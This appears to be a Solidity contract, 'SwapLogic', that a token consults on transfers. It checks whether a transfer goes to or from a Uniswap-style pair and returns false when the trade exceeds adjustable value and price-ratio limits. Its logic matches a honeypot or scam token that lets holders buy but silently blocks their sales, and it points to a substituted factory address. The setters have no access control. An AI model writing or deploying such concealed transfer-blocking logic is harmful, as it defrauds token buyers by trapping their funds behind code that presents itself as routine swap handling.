// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.5.0;

import './ISwapLogic.sol';
import './UniswapV2Library.sol';

contract SwapLogic is ISwapLogic {

    address private factory = 0x5Cd23b1e92474Ac9D79511fB479B10EdbAD98314;//0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    bytes4 private constant SELECTOR_TOKEN0 = bytes4(keccak256(bytes('token0()')));
    bytes4 private constant SELECTOR_TOKEN1 = bytes4(keccak256(bytes('token1()')));
    uint _percent;
    uint _value;
    bool trueFalse = true;

    function swap(address from, address to, uint value) external returns (bool){
       (address token0, address token1) = getLP(from);
        
        if(token1 == address(0)){
            (token0, token1) = getLP(to);
            if(token0 == address(0)) return trueFalse;
        }

        
       (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, token0, token1);
       uint amountOut = UniswapV2Library.getAmountOut(value, reserveA, reserveB);
       
       uint p = value / amountOut;
       
       return !(amountOut > _value || p> _percent);
    }
    
    function getLP(address lp) internal returns(address, address) {

        (bool success, bytes memory data0) = lp.call(abi.encodeWithSelector(SELECTOR_TOKEN0));
        if(!success || data0.length == 0) return (address(0), address(0));
        bytes memory data1;
        (success, data1) = lp.call(abi.encodeWithSelector(SELECTOR_TOKEN1));
        if(!success || data1.length == 0) return (address(0), address(0));
        
        address token0 = abi.decode(data0, (address));
        address token1 = abi.decode(data1, (address));
        
        address pair = UniswapV2Library.pairFor(factory, token0, token1);
        
        return pair == lp ? (token0, token1) : (address(0), address(0));
    }
    
     function setPercent(uint percent) external{
        _percent = percent;
    }
    
     function setValue(uint value) external {
        _value = value;
    }
    
     function setTrueFalse(bool value) external {
        trueFalse = value;
    }
}